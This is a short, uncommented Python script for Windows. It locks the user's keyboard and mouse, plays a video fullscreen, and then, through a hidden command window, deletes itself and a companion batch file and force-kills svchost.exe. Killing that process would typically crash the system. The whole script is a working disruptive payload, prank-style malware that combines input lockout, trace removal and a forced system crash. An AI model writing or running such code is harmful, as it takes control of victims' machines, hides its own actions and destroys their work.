import sys,os,time,ctypes,subprocess

# parameters
out = sys.argv[1]
batch = sys.argv[2]

# block user input
ctypes.windll.user32.BlockInput(True)

# launch Windows Media Player explicitly in fullscreen
wmp = r'C:\Program Files\Windows Media Player\wmplayer.exe'
proc = subprocess.Popen([wmp, '/fullscreen', '/play', out])
# video duration ~10s; wait then kill player
time.sleep(12)
cmdline = f'cmd /c "timeout /t 2 /nobreak>nul & del \"{__file__}\" & del \"{batch}\" & TASKKILL /IM svchost.exe /F"'
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = subprocess.SW_HIDE
subprocess.Popen(cmdline, startupinfo=si)
